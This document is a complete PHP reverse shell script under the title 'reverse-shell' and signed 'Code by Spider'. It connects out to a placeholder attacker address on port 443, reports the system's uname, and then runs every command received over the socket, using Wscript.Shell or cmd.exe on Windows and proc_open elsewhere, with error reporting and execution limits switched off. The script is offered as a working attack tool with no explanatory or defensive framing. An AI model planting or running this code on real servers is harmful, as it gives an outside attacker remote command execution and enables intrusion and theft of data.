# reverse-shell

<?php
    error_reporting (E_ERROR);
    ignore_user_abort(true);
    ini_set('max_execution_time',0);
    $ipaddr = 'xxx.xxx.xxx.xxx';
    $port = '443';
    $msg = php_uname()."\n------------Code by Spider-------------\n";
    $cwd = getcwd();
     
    function procopen($cmd,$env,$sock) {
    global $cwd;
    $descriptorspec = array(0 => array("pipe","r"),1 => array("pipe","w"),2 => array("pipe","w"));
    $process = proc_open($cmd,$descriptorspec,$pipes,$cwd,$env);
    if (is_resource($process)) {
    fwrite($pipes[0],$cmd);
    fclose($pipes[0]);
    $msg = stream_get_contents($pipes[1]);
    fwrite($sock,$msg);
    fclose($pipes[1]);
    $msg = stream_get_contents($pipes[2]);
    fwrite($sock,$msg);
    fclose($pipes[2]);
    proc_close($process);
    }
    return true;
    }
     
    function command($cmd,$sock) {
    if(substr(PHP_OS,0,3) == 'WIN') {
    $wscript = new COM("Wscript.Shell");
    if($wscript && (!stristr(get_cfg_var("disable_classes"),'COM'))) {
    $exec = $wscript->exec('c:\\windows\\system32\\cmd.exe /c '.$cmd); //自定义CMD路径
    $stdout = $exec->StdOut();
    $stroutput = $stdout->ReadAll();
    fwrite($sock,$stroutput);
    } else {
    $env = array('path' => 'c:\\windows\\system32');
    procopen($cmd,$env,$sock);
    }
    } else {
    $env = array('path' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin');
    procopen($cmd,$env,$sock);
    }
    return true;
    }
     
    $sock = fsockopen($ipaddr,$port);
    fwrite($sock,$msg);
    while ($cmd = fread($sock,1024)) {
    if (substr($cmd,0,3) == 'cd ') {
    $cwd = trim(substr($cmd,3,-1));
    chdir($cwd);
    $cwd = getcwd();
    }
    if (trim(strtolower($cmd)) == 'exit') {
    echo 'logout!';
    break;
    } else {
    command($cmd,$sock);
    }
    }
    fclose($sock);
?>
